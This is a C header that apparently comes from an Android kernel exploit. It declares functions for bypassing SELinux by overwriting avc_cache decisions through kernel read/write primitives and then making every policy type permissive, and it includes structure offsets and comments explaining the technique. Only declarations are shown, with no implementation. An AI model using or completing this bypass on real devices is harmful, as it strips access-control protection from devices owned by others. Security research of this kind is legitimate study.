#include <stdbool.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <sepol/policydb/policydb.h>
#include <sepol/policydb/services.h>

#include "kernel_specific.h"
#include "kernel_rw.h"

// avc_cache related offsets
#define AVC_CACHE_SLOTS 512
#define AVC_NODE_LIST_OFFSET 40
#define AVC_ENTRY_SSID_OFFSET 0
#define AVC_ENTRY_AVD_OFFSET 12
#define AV_DECISION_ALLOWED_OFFSET 0

/**
 * SELinux helpers (load_...) code comes mostly from this tool:
 * https://github.com/xmikos/setools-android/tree/master/jni/sepolicy-inject
 * The technique to make all types permissive is the same as option -Z of this tool
 */

/**
 * Load policy from file
 *
 * @param filename
 * @param policy
 * @param pf
 * @return
 */
int load_policy(char *filename, policydb_t *policy, struct policy_file *pf);

/**
 * Write policy to /sys/fs/selinux/policy
 * @param policy
 * @return
 */
int load_policy_into_kernel(policydb_t *policy);

/**
 * Callback that makes any type provided permissive.
 * Even though device is in enforcing mode, permissive mode allows to access the type without perms
 * @param k Type name
 * @param d Pointer to the Type
 * @param args
 * @return
 */
int make_type_permissive(hashtab_key_t k, hashtab_datum_t d, void *args);

/**
 * Makes all types permissive.
 * Note that making all types permissive basically disable SELinux protection
 * @param policy
 * @return
 */
int make_all_types_permissive(policydb_t *policy);

/**
 * Overwrite av_decision.allowed with 0xffffffff only if sid matches
 * @param hlist_node Current to start from
 * @param sid SID of a process
 */
void overwrite_avc_nodes_decisions(unsigned long hlist_node, int sid);

/**
 * Go through each slots of avc_cache, then for each avc_node set its av_decision.allowed field
 * to 0xffffffff.
 * Decision that where cached as denied eg: write policy to /sys/fs/selinux/policy is now allowed
 * So trying to do it again succeed.
 * The idea comes from chompie1337:
 * https://github.com/chompie1337/s8_2019_2215_poc/blob/34f6481ed4ed4cff661b50ac465fc73655b82f64/poc/selinux_bypass.c#L16
 * @param avc_cache_addr
 * @param sid SID of a process
 */
void overwrite_avc_cache(unsigned long avc_cache_addr, int sid);

/**
 * Set ss_initialized's value
 * @param ss_initialized address of ss_initialized
 * @param value new value for ss_initialized
 */
void set_ss_initialized(unsigned long ss_initialized, unsigned int value);

/**
 * Try to read, (update) then write policy to kernel. This fails. Then overwrite avc_cache so
 * that it looks like we succeed. Then try again, avc_cache thinks we previously succeed so it
 * allows us to read, update (make all type permissive) and overwrite policy
 * @return true if SELinux bypass succeed
 */
bool live_with_selinux();

/**
 * Disable SELinux, not used
 * Overwrite selinux_enforcing with 0 - Not possible in most kernel build as variable is defined
 * using pre-processor directive
 */
void disable_selinux();